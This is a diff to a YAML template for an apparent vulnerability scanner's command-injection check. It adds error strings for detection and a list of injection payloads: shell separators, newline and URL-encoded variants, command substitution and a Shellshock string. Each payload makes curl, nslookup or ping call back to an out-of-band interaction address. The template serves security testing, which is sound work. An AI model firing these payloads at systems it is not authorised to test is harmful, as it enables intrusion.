@@ -17,21 +17,49 @@ detection_methods:
   - response_condition:
       contains: "Syntax error:"
       confidence: 70
+  - response_condition:
+      contains: "/bin/sh:"
+      confidence: 80
+  - response_condition:
+      contains: "/bin/bash:"
+      confidence: 80
+  - response_condition:
+      contains: "is not recognized as an internal or external command"
+      confidence: 80
 vars:
   - name: oob_address
     value: "{{interactionAddress}}"
   - name: test
     value: "test"
 templates:
+  # Basic separators (most common)
   - "&& curl {{.oob_address}}"
+  - "|| nslookup {{.oob_address}}"
+  - "& nslookup {{.oob_address}}"
+  - "; curl {{.oob_address}}"
+  - "| nslookup {{.oob_address}}"
+
+  # Newline injections
+  - "%0A curl {{.oob_address}}"
   - "%0A nslookup {{.oob_address}}"
   - "%0A ping -c 3 {{.oob_address}}"
-  - "%0A wget {{.oob_address}}"
-  - "%0A curl {{.oob_address}}"
-  - "|| nslookup {{.oob_address}}"
-  - "&& nslookup {{.oob_address}}"
-  - "|| ping -c 3 {{.oob_address}}"
-  - "&& ping -c 3 {{.oob_address}}"
+  
+  # Command substitution 
+  - "`curl {{.oob_address}}`"
+  - "$(nslookup {{.oob_address}})"
+  
+  # Shellshock
   - '() { :;}; /bin/bash -c "curl http://{{.oob_address}}/"'
+  
+  # direct injection
+  - "nslookup {{.oob_address}}"
+  - "curl {{.oob_address}}"
+
+  # Semicolon + newline
+  - ";%0a curl {{.oob_address}}"        
+  - ";%0a nslookup {{.oob_address}}"
+  # URL encoded semicolon
+  - "%3b curl {{.oob_address}}"             
+  - "%3b nslookup {{.oob_address}}"   
 categories:
   - command_injection
